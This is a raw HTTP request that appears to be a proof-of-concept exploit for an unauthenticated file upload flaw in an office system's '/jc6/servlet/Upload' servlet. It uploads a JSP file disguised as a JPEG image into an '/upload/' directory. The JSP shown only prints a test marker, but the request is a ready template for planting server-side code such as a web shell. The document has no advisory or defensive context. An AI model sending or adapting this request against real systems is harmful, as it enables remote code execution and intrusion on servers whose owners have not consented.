```
POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 197
Content-Type: multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d

--ee055230808ca4602e92d0b7c4ecc63d
Content-Disposition: form-data; name="img"; filename="1.jsp"
Content-Type: image/jpeg

<% out.println("tteesstt1"); %>
--ee055230808ca4602e92d0b7c4ecc63d--
```

